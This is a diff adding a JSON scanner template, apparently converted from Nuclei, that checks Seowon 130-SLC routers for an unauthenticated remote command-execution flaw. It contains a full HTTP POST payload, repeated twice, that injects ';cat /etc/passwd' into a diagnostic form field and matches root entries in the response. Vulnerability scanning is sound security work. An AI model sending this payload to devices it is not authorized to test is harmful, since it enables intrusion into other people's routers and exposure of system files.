@@ -1,0 +1,147 @@
+{
+  "id": "seowon-router-rce",
+  "name": "Seowon 130-SLC router -  Remote Code Execution",
+  "author": "gy741",
+  "severity": "CRITICAL",
+  "description": "Seowon 130-SLC router lets remote attackers execute commands without authentication as admin users via the router ip \u0026 Port(if available) in the request.\n",
+  "references": [
+    "https://www.exploit-db.com/exploits/50295"
+  ],
+  "tags": [
+    "unauth",
+    "iot",
+    "edb",
+    "rce",
+    "seowon",
+    "router"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-77",
+  "cvssScore": "10",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nReferer: {{BaseURL}}/diagnostic.html?t\u003d201701020919\nCookie: product\u003dcpe; cpe_buildTime\u003d201701020919; vendor\u003dmobinnet; connType\u003dlte; cpe_multiPdnEnable\u003d1; cpe_lang\u003den; cpe_voip\u003d0; cpe_cwmpc\u003d1; cpe_snmp\u003d1; filesharing\u003d0; cpe_switchEnable\u003d0; cpe_IPv6Enable\u003d0; cpe_foc\u003d0; cpe_vpn\u003d1; cpe_httpsEnable\u003d0; cpe_internetMTUEnable\u003d0; cpe_opmode\u003dlte; sessionTime\u003d1631653385102; cpe_login\u003dadmin\n\nCommand\u003dDiagnostic\u0026traceMode\u003dtrace\u0026reportIpOnly\u003d0\u0026pingPktSize\u003d56\u0026pingTimeout\u003d30\u0026pingCount\u003d4\u0026ipAddr\u003d\u0026maxTTLCnt\u003d30\u0026queriesCnt\u003d;cat /etc/passwd\u0026reportIpOnlyCheckbox\u003don\u0026btnApply\u003dApply\u0026T\u003d1631653402928\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "root:.*:0:0:"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "seowon-router-rce",
+    "info": {
+      "name": "Seowon 130-SLC router -  Remote Code Execution",
+      "author": "gy741",
+      "severity": "critical",
+      "description": "Seowon 130-SLC router lets remote attackers execute commands without authentication as admin users via the router ip \u0026 Port(if available) in the request.\n",
+      "reference": [
+        "https://www.exploit-db.com/exploits/50295"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "cvss_score": "10",
+        "cwe_id": "CWE-77"
+      },
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "unauth,iot,edb,rce,seowon,router"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nReferer: {{BaseURL}}/diagnostic.html?t\u003d201701020919\nCookie: product\u003dcpe; cpe_buildTime\u003d201701020919; vendor\u003dmobinnet; connType\u003dlte; cpe_multiPdnEnable\u003d1; cpe_lang\u003den; cpe_voip\u003d0; cpe_cwmpc\u003d1; cpe_snmp\u003d1; filesharing\u003d0; cpe_switchEnable\u003d0; cpe_IPv6Enable\u003d0; cpe_foc\u003d0; cpe_vpn\u003d1; cpe_httpsEnable\u003d0; cpe_internetMTUEnable\u003d0; cpe_opmode\u003dlte; sessionTime\u003d1631653385102; cpe_login\u003dadmin\n\nCommand\u003dDiagnostic\u0026traceMode\u003dtrace\u0026reportIpOnly\u003d0\u0026pingPktSize\u003d56\u0026pingTimeout\u003d30\u0026pingCount\u003d4\u0026ipAddr\u003d\u0026maxTTLCnt\u003d30\u0026queriesCnt\u003d;cat /etc/passwd\u0026reportIpOnlyCheckbox\u003don\u0026btnApply\u003dApply\u0026T\u003d1631653402928\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "root:.*:0:0:"
+            ],
+            "group": 1,
+            "internal": true
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
